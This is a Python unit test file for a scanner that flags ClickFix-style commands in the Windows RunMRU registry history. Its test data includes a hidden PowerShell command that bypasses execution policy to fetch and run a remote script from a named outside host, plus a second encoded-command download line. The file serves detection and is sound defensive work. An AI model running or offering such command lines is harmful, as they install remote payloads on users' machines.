import unittest
from unittest.mock import patch

from guardian.scanner import ScanEngine


class FakeKey:
    def __init__(self, values):
        self.values = values

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        return False


class FakeWinReg:
    HKEY_CURRENT_USER = object()
    KEY_READ = 0x20019
    KEY_WOW64_64KEY = 0x0100

    def __init__(self, values):
        self.values = values

    def OpenKey(self, *_args):
        return FakeKey(self.values)

    def EnumValue(self, _key, index):
        if index >= len(self.values):
            raise OSError("No more values")
        return self.values[index]


class RunMruTests(unittest.TestCase):
    def test_exact_z797_run_dialog_command_is_reported_read_only(self):
        values = [
            ("MRUList", "a", 1),
            ("a", 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://benderoflight.com/nfront.php"', 1),
        ]
        engine = ScanEngine()
        fake = FakeWinReg(values)
        with patch("guardian.scanner.windows.IS_WINDOWS", True), patch("guardian.scanner.winreg", fake):
            engine._scan_run_mru()
        self.assertEqual(len(engine.findings), 1)
        finding = engine.findings[0]
        self.assertEqual(finding.severity, "High")
        self.assertEqual(finding.confidence, "High")
        self.assertEqual(finding.remediation, "none")
        self.assertIn("benderoflight.com", " ".join(finding.evidence))
        self.assertTrue(finding.metadata["evidence_only"])

    def test_unrelated_clickfix_like_command_is_context_only(self):
        values = [("b", 'powershell.exe -NoProfile -EncodedCommand abc; Invoke-WebRequest https://example.invalid/stage', 1)]
        engine = ScanEngine()
        with patch("guardian.scanner.windows.IS_WINDOWS", True), patch("guardian.scanner.winreg", FakeWinReg(values)):
            engine._scan_run_mru()
        self.assertEqual(engine.findings, [])

    def test_normal_run_history_is_ignored(self):
        values = [("a", "notepad.exe", 1), ("b", "powershell.exe -NoProfile -Command Get-Date", 1)]
        engine = ScanEngine()
        with patch("guardian.scanner.windows.IS_WINDOWS", True), patch("guardian.scanner.winreg", FakeWinReg(values)):
            engine._scan_run_mru()
        self.assertEqual(engine.findings, [])


if __name__ == "__main__":
    unittest.main()
